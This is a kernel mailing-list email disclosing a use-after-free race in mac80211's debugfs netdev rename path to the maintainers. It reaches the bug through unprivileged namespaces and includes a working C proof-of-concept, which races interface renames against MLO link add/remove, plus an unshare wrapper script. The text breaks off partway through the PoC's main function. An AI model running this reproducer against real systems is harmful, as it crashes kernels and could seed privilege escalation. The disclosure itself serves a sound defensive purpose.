Received: from mail-pf1-f175.google.com (mail-pf1-f175.google.com [209.85.210.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 87D45389105
	for <linux-wireless@vger.kernel.org>; Mon,  3 Aug 2026 04:07:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785730078; cv=none; b=IXramIXaDWHpUfdoEgW9tJ9rLMEp96QW2izSz+HC6M8f8QTzGOzHdKTNW8ch892SEEyWpJowVQ9kZ9N1xP4m3lmD9qswv0cj9iPoX1739mc/pm/6J4yRdrJz2waV+A07SY0pR5cB7Q+9FQ1KaUlHmU7VHaTQMh2AtrR2ybxxBcc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785730078; c=relaxed/simple;
	bh=2ZDGfxXQMV3aNx8/nxGl8GnhJmb6LUVA6JVIL3mM+ZM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=YCMFq59/Z5dNlXcd9I4ZtgbRyGPtPHoDFWfja5ytR29Swdtpko8+f594qPXluVFcOL/zf+IEPm8c/aRdiiLFNLe1w5QNj5ORYg5bgJCQBqaYN8aMdhi7HMe309qtNi1VKz5pZ/3PfqklmIe+Ol+15b0GDDmVWl6OKa04gSAVz7Y=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IVWuEjK2; arc=none smtp.client-ip=209.85.210.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IVWuEjK2"
Received: by mail-pf1-f175.google.com with SMTP id d2e1a72fcca58-84a4d8fd6ecso3091324b3a.1
        for <linux-wireless@vger.kernel.org>; Sun, 02 Aug 2026 21:07:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785730076; x=1786334876; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=c7vnPVsk8QSvAVRBzUIE9C86A26XAE2dwPT+piuYYug=;
        b=IVWuEjK2lqjjb5MWmmm2J4RZ4D6sV0z7ArWmzKqAZW4z3nyLTbgVQmDNdiTDsljRWU
         ClbQjHgER39gDd0hzxo9Zny6yu5arWI5d3Jbf9cQCJ/XyIAOT8bgp4ujIphY/a8FvOmA
         xtsYDoY2iHhnKj6+N3/wmDM0h6FMjQWMDGm+8TJT2svdy4IYdeF3kFYcvVDoDd/cUKWl
         MBnGcUfN6u5JFpkAXHBiypUpK6kHc3+z2KEBk4LcCJ+MVcI4Tr3/laV7r4+0zkfVhJ+d
         p6nRsqR6RSRxzdHd3gBvGliR/eX/AInfp6pSc4ItoqUFgRKiDbIe55vDYhlHsdzG4gkQ
         pqoA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785730076; x=1786334876;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=c7vnPVsk8QSvAVRBzUIE9C86A26XAE2dwPT+piuYYug=;
        b=Bp3+J1BKvQEMT0tE7HyRzLcHQ1NoWpuwG55MyM097IqIwJyfauebTuYJDRjs1hIr//
         N7H2s2eSYEWWeTGLt5i7scgU/yYebr0VcwKiJsgVCT7SzUWNSbXbYcp5V9tj8Ol7UsA6
         b0qCFoNY+5AeAFxJoQhdGepH8KpT089a6/77sYMLvx+1URKYCQ98UA3r0/2bLeICFjJd
         EfYXiVTopphkmMJ657RHqJR0sunB0eX0Xney71nKXM2EskVk3fyYtAWyN2PNsrg5lFUy
         C21ua2CVgx/eb5LGHkdABzpliE60uR+7Xk589l6FnLyBifp019/wzpB6e9f6ajLIMFwR
         WzNg==
X-Gm-Message-State: AOJu0YyLP8rK5pmHuqDHIRvO6OWly4zFq0bJZLx80LgL+5zZEahFfDCP
	kUzlPeYr8ccd38EdTMfO+LBUSxMPtVp07F3FyQYcse/flH9YUo9nQ6ztGB2jfRocv+w/TtFlVN7
	10bJ+IiPFA2+EQg==
X-Gm-Gg: AR+sD13AKvtCJ0oOzku3zwvCzmkocknDAXn2vTpKdEC27WeFpXWHDQpQ8SlrO4vOmh/
	FIJ/mVWIPhG/ZpTlM8VDv40tIoIhix+69o5Cp9tdX2rGDdXvx+FFBI1hmveLVBv/ivhUjyXtqTi
	Lve33TorP2E5J4Moy8PmHPuXv5AuiGIzGrQOaCFGPlWK+QVRbhBBWt0uWjMWAk1MwWkNpLe57VX
	b5JH0eleAJBU6m1JfEnsBB4j06VG2SSdbj1Fii5zeD02vvpt6fOicdQS38hHiB8BN5uHzIlCdtS
	+rm/l0wjuqVHN9yFPARA0DSaABQl9V2sq7eS0ItMSKasWff/SW3323gy0oQrhIYX3JnQWC/9xiD
	9xjliASr0BlEH1/J0SYpKv4tucLcTowJfdgwh4cCEWpPYtE9+/uxL8yn6uDljIAf+vRCbjOL38s
	2bMzgLWeT2cKMF27BIVFFYCZC4XXnlrOj6c0dpfS9JGa8BBUR+0tHPumJQrIAHqOGmagpLsBkfP
	qpCh1Ls3FxN
X-Received: by 2002:a05:6a00:2d04:b0:848:59fd:2f4d with SMTP id d2e1a72fcca58-84ee49d9a63mr7516847b3a.73.1785730075495;
        Sun, 02 Aug 2026 21:07:55 -0700 (PDT)
Received: from Roxy.localdomain ([202.8.9.242])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edbe791dfsm3119723b3a.23.2026.08.02.21.07.51
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 21:07:54 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	gregory.greenman@intel.com,
	miriam.rachel.korenblit@intel.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH wireless 0/1] wifi: mac80211: serialize debugfs netdev rename with recreate
Date: Mon,  3 Aug 2026 12:07:39 +0800
Message-ID: <cover.1785729184.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/mac80211/debugfs_netdev.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ieee80211_debugfs_rename_netdev() reads sdata->vif.debugfs_dir into a raw dentry
pointer and calls debugfs_change_name() without serializing against netdev debugfs
teardown and recreation.

When the first AP MLO link is added or the last link is removed,
ieee80211_vif_update_links() recreates the netdev debugfs directory and
ieee80211_debugfs_remove_netdev() removes the old dentry.

A concurrent NETDEV_CHANGENAME path reaches ieee80211_debugfs_rename_netdev()
through netdev_notify(), observes the stale dentry, and debugfs_rename() later
dereferences the already removed object.

In our runs this crashes through simple_rename_timestamp(), simple_rename(),
debugfs_rename(), and ieee80211_debugfs_rename_netdev().

Reproducer:

    chmod +x ~/poc.sh
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"

make -C "$DIR"
exec "$DIR/poc" "${1:-180}"

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/*
 * Minimal hwsim-only subset copied from the in-tree driver header so the PoC
 * can talk to the MAC80211_HWSIM generic-netlink family from userspace.
 */
enum hwsim_commands {
	HWSIM_CMD_UNSPEC,
	HWSIM_CMD_REGISTER,
	HWSIM_CMD_FRAME,
	HWSIM_CMD_TX_INFO_FRAME,
	HWSIM_CMD_NEW_RADIO,
	HWSIM_CMD_DEL_RADIO,
	HWSIM_CMD_GET_RADIO,
};

enum hwsim_attrs {
	HWSIM_ATTR_UNSPEC,
	HWSIM_ATTR_ADDR_RECEIVER,
	HWSIM_ATTR_ADDR_TRANSMITTER,
	HWSIM_ATTR_FRAME,
	HWSIM_ATTR_FLAGS,
	HWSIM_ATTR_RX_RATE,
	HWSIM_ATTR_SIGNAL,
	HWSIM_ATTR_TX_INFO,
	HWSIM_ATTR_COOKIE,
	HWSIM_ATTR_CHANNELS,
	HWSIM_ATTR_RADIO_ID,
	HWSIM_ATTR_REG_HINT_ALPHA2,
	HWSIM_ATTR_REG_CUSTOM_REG,
	HWSIM_ATTR_REG_STRICT_REG,
	HWSIM_ATTR_SUPPORT_P2P_DEVICE,
	HWSIM_ATTR_USE_CHANCTX,
	HWSIM_ATTR_DESTROY_RADIO_ON_CLOSE,
	HWSIM_ATTR_RADIO_NAME,
	HWSIM_ATTR_NO_VIF,
	HWSIM_ATTR_FREQ,
	HWSIM_ATTR_PAD,
	HWSIM_ATTR_TX_INFO_FLAGS,
	HWSIM_ATTR_PERM_ADDR,
	HWSIM_ATTR_IFTYPE_SUPPORT,
	HWSIM_ATTR_CIPHER_SUPPORT,
	HWSIM_ATTR_MLO_SUPPORT,
	HWSIM_ATTR_PMSR_SUPPORT,
	HWSIM_ATTR_PMSR_REQUEST,
	HWSIM_ATTR_PMSR_RESULT,
	HWSIM_ATTR_MULTI_RADIO,
};

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#define NLA_NEXT(nla, attrlen) \
	((attrlen) -= NLA_ALIGN((nla)->nla_len), \
	 (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#define NLA_OK(nla, len) \
	((len) >= (int)sizeof(struct nlattr) && \
	 (nla)->nla_len >= sizeof(struct nlattr) && \
	 (nla)->nla_len <= (len))

static volatile sig_atomic_t stop_flag;

static unsigned long rename_ops;
static unsigned long link_add_ops;
static unsigned long link_del_ops;

struct nl_ctx {
	int fd;
	uint32_t seq;
	uint32_t portid;
};

struct race_ctx {
	struct nl_ctx genl;
	int nl80211_id;
	int ifindex;
	unsigned int link_id;
	char name_a[IFNAMSIZ];
	char name_b[IFNAMSIZ];
	uint8_t link_addr[6];
};

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static void on_signal(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) && errno != EINVAL)
		perror("sched_setaffinity");
}

static int nl_open(int protocol)
{
	int fd;
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};
	socklen_t addrlen = sizeof(addr);

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, protocol);
	if (fd < 0)
		die("socket(AF_NETLINK, %d): %s", protocol, strerror(errno));

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(netlink): %s", strerror(errno));

	if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0)
		die("getsockname(netlink): %s", strerror(errno));

	return fd;
}

static void nl_ctx_init(struct nl_ctx *ctx, int protocol)
{
	memset(ctx, 0, sizeof(*ctx));
	ctx->fd = nl_open(protocol);
	ctx->portid = (uint32_t)getpid();
	ctx->seq = 1;
}

static int addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		     const void *data, size_t alen)
{
	size_t len = NLA_HDRLEN + alen;
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(len);
	struct nlattr *nla;

	if (newlen > maxlen)
		return -EMSGSIZE;

	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	nla->nla_type = type;
	nla->nla_len = len;
	if (alen)
		memcpy((char *)nla + NLA_HDRLEN, data, alen);
	memset((char *)nla + len, 0, NLA_ALIGN(len) - len);
	nlh->nlmsg_len = newlen;
	return 0;
}

static int addattr_flag(struct nlmsghdr *nlh, size_t maxlen, int type)
{
	return addattr_l(nlh, maxlen, type, NULL, 0);
}

static int addattr_u8(struct nlmsghdr *nlh, size_t maxlen, int type, uint8_t val)
{
	return addattr_l(nlh, maxlen, type, &val, sizeof(val));
}

static int addattr_u32(struct nlmsghdr *nlh, size_t maxlen, int type, uint32_t val)
{
	return addattr_l(nlh, maxlen, type, &val, sizeof(val));
}

static int addattr_strz(struct nlmsghdr *nlh, size_t maxlen, int type, const char *s)
{
	return addattr_l(nlh, maxlen, type, s, strlen(s) + 1);
}

static void parse_attrs(struct nlattr *tb[], size_t maxtype,
			struct nlattr *head, int len)
{
	struct nlattr *nla;

	memset(tb, 0, sizeof(tb[0]) * (maxtype + 1));
	for (nla = head; NLA_OK(nla, len); nla = NLA_NEXT(nla, len)) {
		if (nla->nla_type <= maxtype)
			tb[nla->nla_type] = nla;
	}
}

static int nl_talk(struct nl_ctx *ctx, struct nlmsghdr *nlh, char *reply,
		   size_t reply_len)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	int ret;

	nlh->nlmsg_seq = ++ctx->seq;
	nlh->nlmsg_pid = ctx->portid;

	ret = sendmsg(ctx->fd, &msg, 0);
	if (ret < 0)
		return -errno;

	for (;;) {
		ssize_t len;
		struct nlmsghdr *h;

		len = recv(ctx->fd, reply, reply_len, 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (h = (struct nlmsghdr *)reply; NLMSG_OK(h, (unsigned int)len);
		     h = NLMSG_NEXT(h, len)) {
			if (h->nlmsg_seq != ctx->seq)
				continue;

			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(h);

				if ((int)h->nlmsg_len < (int)NLMSG_LENGTH(sizeof(*err)))
					return -EIO;
				if (!err->error)
					return 0;
				return err->error;
			}

			return 1;
		}
	}
}

static int genl_get_family_id(struct nl_ctx *ctx, const char *family)
{
	char reqbuf[256];
	char repbuf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct genlmsghdr *ghdr;
	struct nlattr *tb[CTRL_ATTR_MAX + 1];
	int ret;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	ghdr = NLMSG_DATA(nlh);
	ghdr->cmd = CTRL_CMD_GETFAMILY;
	ghdr->version = 1;

	ret = addattr_strz(nlh, sizeof(reqbuf), CTRL_ATTR_FAMILY_NAME, family);
	if (ret)
		return ret;

	ret = nl_talk(ctx, nlh, repbuf, sizeof(repbuf));
	if (ret <= 0)
		return ret ? ret : -ENOENT;

	nlh = (struct nlmsghdr *)repbuf;
	ghdr = NLMSG_DATA(nlh);
	parse_attrs(tb, CTRL_ATTR_MAX,
		    (struct nlattr *)((char *)ghdr + GENL_HDRLEN),
		    nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN));
	if (!tb[CTRL_ATTR_FAMILY_ID])
		return -ENOENT;

	return *(uint16_t *)NLA_DATA(tb[CTRL_ATTR_FAMILY_ID]);
}

static int nl80211_dump_wiphy_index(struct race_ctx *ctx, const char *phyname,
				    unsigned int *idx_out)
{
	char reqbuf[256];
	char repbuf[16384];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct genlmsghdr *ghdr = NLMSG_DATA(nlh);
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = 0,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	uint32_t seq;
	bool found = false;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = ctx->nl80211_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
	nlh->nlmsg_pid = ctx->genl.portid;
	nlh->nlmsg_seq = ++ctx->genl.seq;
	ghdr->cmd = NL80211_CMD_GET_WIPHY;
	ghdr->version = 1;
	iov.iov_len = nlh->nlmsg_len;
	seq = nlh->nlmsg_seq;

	if (sendmsg(ctx->genl.fd, &msg, 0) < 0)
		return -errno;

	for (;;) {
		ssize_t len;
		struct nlmsghdr *h;

			len = recv(ctx->genl.fd, repbuf, sizeof(repbuf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (h = (struct nlmsghdr *)repbuf; NLMSG_OK(h, (unsigned int)len);
		     h = NLMSG_NEXT(h, len)) {
			struct nlattr *tb[NL80211_ATTR_MAX + 1];
			const char *name;

			if (h->nlmsg_seq != seq)
				continue;
			if (h->nlmsg_type == NLMSG_DONE)
				return found ? 0 : -ENOENT;
			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(h);

				if ((int)h->nlmsg_len <
				    (int)NLMSG_LENGTH(sizeof(*err)))
					return -EIO;
				return err->error ? err->error : 0;
			}

			ghdr = NLMSG_DATA(h);
			parse_attrs(tb, NL80211_ATTR_MAX,
				    (struct nlattr *)((char *)ghdr + GENL_HDRLEN),
				    h->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN));
			if (!tb[NL80211_ATTR_WIPHY_NAME] ||
			    !tb[NL80211_ATTR_WIPHY])
				continue;

			name = NLA_DATA(tb[NL80211_ATTR_WIPHY_NAME]);
			if (strcmp(name, phyname))
				continue;

			*idx_out = *(uint32_t *)NLA_DATA(tb[NL80211_ATTR_WIPHY]);
			found = true;
		}
	}
}

static unsigned int wait_for_wiphy_index(struct race_ctx *ctx, const char *phyname)
{
	struct timespec ts = { .tv_sec = 0, .tv_nsec = 20 * 1000 * 1000 };
	unsigned int idx = 0;
	unsigned int i;
	int ret;

	for (i = 0; i < 500; i++) {
		ret = nl80211_dump_wiphy_index(ctx, phyname, &idx);
		if (!ret)
			return idx;
		if (ret != -ENODEV && ret != -ENOENT)
			die("failed to resolve wiphy %s: %s",
			    phyname, strerror(-ret));
		nanosleep(&ts, NULL);
	}

	die("timed out waiting for %s to appear", phyname);
	return 0;
}

static int hwsim_new_radio(struct race_ctx *ctx, const char *phyname)
{
	char reqbuf[512];
	char repbuf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct genlmsghdr *ghdr;
	int hwsim_id, ret;
	uint32_t channels = 2;

	hwsim_id = genl_get_family_id(&ctx->genl, "MAC80211_HWSIM");
	if (hwsim_id < 0)
		return hwsim_id;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = hwsim_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	ghdr = NLMSG_DATA(nlh);
	ghdr->cmd = HWSIM_CMD_NEW_RADIO;
	ghdr->version = 1;

	ret = addattr_flag(nlh, sizeof(reqbuf), HWSIM_ATTR_DESTROY_RADIO_ON_CLOSE);
	ret = ret ?: addattr_flag(nlh, sizeof(reqbuf), HWSIM_ATTR_NO_VIF);
	ret = ret ?: addattr_flag(nlh, sizeof(reqbuf), HWSIM_ATTR_MLO_SUPPORT);
	ret = ret ?: addattr_flag(nlh, sizeof(reqbuf), HWSIM_ATTR_USE_CHANCTX);
	ret = ret ?: addattr_u32(nlh, sizeof(reqbuf), HWSIM_ATTR_CHANNELS,
				 channels);
	ret = ret ?: addattr_strz(nlh, sizeof(reqbuf), HWSIM_ATTR_RADIO_NAME,
				  phyname);
	if (ret)
		return ret;

	ret = nl_talk(&ctx->genl, nlh, repbuf, sizeof(repbuf));
	return ret < 0 ? ret : 0;
}

static int nl80211_new_interface(struct race_ctx *ctx, unsigned int wiphy_idx,
				 const char *ifname)
{
	char reqbuf[256];
	char repbuf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct genlmsghdr *ghdr;
	uint32_t type = NL80211_IFTYPE_AP;
	int ret;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = ctx->nl80211_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	ghdr = NLMSG_DATA(nlh);
	ghdr->cmd = NL80211_CMD_NEW_INTERFACE;
	ghdr->version = 1;

	ret = addattr_u32(nlh, sizeof(reqbuf), NL80211_ATTR_WIPHY, wiphy_idx);
	ret = ret ?: addattr_strz(nlh, sizeof(reqbuf), NL80211_ATTR_IFNAME, ifname);
	ret = ret ?: addattr_u32(nlh, sizeof(reqbuf), NL80211_ATTR_IFTYPE, type);
	if (ret)
		return ret;

	ret = nl_talk(&ctx->genl, nlh, repbuf, sizeof(repbuf));
	return ret < 0 ? ret : 0;
}

static int nl80211_add_link(struct race_ctx *ctx)
{
	char reqbuf[256];
	char repbuf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct genlmsghdr *ghdr;
	int ret;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = ctx->nl80211_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	ghdr = NLMSG_DATA(nlh);
	ghdr->cmd = NL80211_CMD_ADD_LINK;
	ghdr->version = 1;

	ret = addattr_u32(nlh, sizeof(reqbuf), NL80211_ATTR_IFINDEX, ctx->ifindex);
	ret = ret ?: addattr_u8(nlh, sizeof(reqbuf), NL80211_ATTR_MLO_LINK_ID,
				(uint8_t)ctx->link_id);
	ret = ret ?: addattr_l(nlh, sizeof(reqbuf), NL80211_ATTR_MAC,
			       ctx->link_addr, sizeof(ctx->link_addr));
	if (ret)
		return ret;

	ret = nl_talk(&ctx->genl, nlh, repbuf, sizeof(repbuf));
	return ret < 0 ? ret : 0;
}

static int nl80211_remove_link(struct race_ctx *ctx)
{
	char reqbuf[256];
	char repbuf[8192];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct genlmsghdr *ghdr;
	int ret;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ghdr));
	nlh->nlmsg_type = ctx->nl80211_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	ghdr = NLMSG_DATA(nlh);
	ghdr->cmd = NL80211_CMD_REMOVE_LINK;
	ghdr->version = 1;

	ret = addattr_u32(nlh, sizeof(reqbuf), NL80211_ATTR_IFINDEX, ctx->ifindex);
	ret = ret ?: addattr_u8(nlh, sizeof(reqbuf), NL80211_ATTR_MLO_LINK_ID,
				(uint8_t)ctx->link_id);
	if (ret)
		return ret;

	ret = nl_talk(&ctx->genl, nlh, repbuf, sizeof(repbuf));
	return ret < 0 ? ret : 0;
}

static int if_ioctl_socket(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);

	if (fd < 0)
		die("socket(AF_INET): %s", strerror(errno));
	return fd;
}

static int set_if_up(const char *ifname)
{
	int fd = if_ioctl_socket();
	struct ifreq ifr;
	int ret;

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	ret = ioctl(fd, SIOCGIFFLAGS, &ifr);
	if (ret == 0) {
		ifr.ifr_flags |= IFF_UP;
		ret = ioctl(fd, SIOCSIFFLAGS, &ifr);
	}
	close(fd);
	return ret ? -errno : 0;
}

static int rename_if(const char *oldname, const char *newname)
{
	int fd = if_ioctl_socket();
	struct ifreq ifr;
	int ret;

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", oldname);
	snprintf(ifr.ifr_newname, sizeof(ifr.ifr_newname), "%s", newname);
	ret = ioctl(fd, SIOCSIFNAME, &ifr);
	close(fd);
	return ret ? -errno : 0;
}

static void *rename_worker(void *arg)
{
	struct race_ctx *ctx = arg;
	char cur[IFNAMSIZ];
	char next[IFNAMSIZ];

	pin_to_cpu(0);
	strncpy(cur, ctx->name_a, sizeof(cur));
	strncpy(next, ctx->name_b, sizeof(next));

	while (!stop_flag) {
		int ret = rename_if(cur, next);

		if (!ret) {
			char tmp[IFNAMSIZ];

			rename_ops++;
			memcpy(tmp, cur, sizeof(tmp));
			memcpy(cur, next, sizeof(cur));
			memcpy(next, tmp, sizeof(next));
			continue;
		}

		if (ret == -EINTR)
			continue;
		if (ret == -ENODEV || ret == -EBUSY || ret == -EEXIST)
			continue;

		fprintf(stderr, "rename %s -> %s failed: %s\n",
			cur, next, strerror(-ret));
		break;
	}

	stop_flag = 1;
	return NULL;
}

static void *link_worker(void *arg)
{
	struct race_ctx *ctx = arg;
	bool added = false;

	pin_to_cpu(1);

	while (!stop_flag) {
		int ret;

		if (!added) {
			ret = nl80211_add_link(ctx);
			if (!ret) {
				added = true;
				link_add_ops++;
				continue;
			}
			if (ret == -EINTR || ret == -EAGAIN || ret == -EBUSY)
				continue;
			if (ret == -EEXIST || ret == -EALREADY) {
				added = true;
				continue;
			}
			fprintf(stderr, "add_link failed: %s\n", strerror(-ret));
			break;
		}

		ret = nl80211_remove_link(ctx);
		if (!ret) {
			added = false;
			link_del_ops++;
			continue;
		}
		if (ret == -EINTR || ret == -EAGAIN || ret == -EBUSY)
			continue;
		if (ret == -ENOENT) {
			added = false;
			continue;
		}
		fprintf(stderr, "remove_link failed: %s\n", strerror(-ret));
		break;
	}

	stop_flag = 1;
	return NULL;
}

static void log_stats(void)
{
	fprintf(stderr, "stats: renames=%lu add_link=%lu del_link=%lu\n",
		rename_ops, link_add_ops, link_del_ops);
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s [duration_seconds]\n", prog);
	exit(EXIT_FAILURE);
}

int main(int argc, char **argv)
{
	struct race_ctx ctx;
	pthread_t th_rename;
	pthread_t th_link;
	unsigned int duration = 180;
	unsigned int wiphy_idx;
	time_t start;
	int ret;
	pid_t pid = getpid();

	if (argc > 2)
		usage(argv[0]);
	if (argc == 2)
		duration = strtoul(argv[1], NULL, 0);

	memset(&ctx, 0, sizeof(ctx));
	snprintf(ctx.name_a, sizeof(ctx.name_a), "racea%d", pid % 10000);
	snprintf(ctx.name_b, sizeof(ctx.name_b), "raceb%d", pid % 10000);
	ctx.link_id = 1;
	ctx.link_addr[0] = 0x02;
	ctx.link_addr[1] = 0xaa;
	ctx.link_addr[2] = 0xbb;
	ctx.link_addr[3] = 0xcc;
	ctx.link_addr[4] = (pid >> 8) & 0xff;
	ctx.link_addr[5] = pid & 0xff;

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	nl_ctx_init(&ctx.genl, NETLINK_GENERIC);
	ctx.nl80211_id = genl_get_family_id(&ctx.genl, "nl80211");
	if (ctx.nl80211_id < 0)
		die("failed to resolve nl80211 family: %s",
		    strerror(-ctx.nl80211_id));

	char phyname[IFNAMSIZ];

	snprintf(phyname, sizeof(phyname), "pocphy%d", pid % 10000);
	ret = hwsim_new_radio(&ctx, phyname);
	if (ret)
		die("HWSIM_CMD_NEW_RADIO failed: %s", strerror(-ret));

	wiphy_idx = wait_for_wiphy_index(&ctx, phyname);

	ret = nl80211_new_interface(&ctx, wiphy_idx, ctx.name_a);
	if (ret)
		die("NL80211_CMD_NEW_INTERFACE failed: %s", strerror(-ret));

	ctx.ifindex = if_nametoindex(ctx.name_a);
	if (!ctx.ifindex)
		die("if_nametoindex(%s): %s", ctx.name_a, strerror(errno));

	ret = set_if_up(ctx.name_a);
	if (ret)
		die("failed to bring %s up: %s", ctx.name_a, strerror(-ret));

	fprintf(stderr,
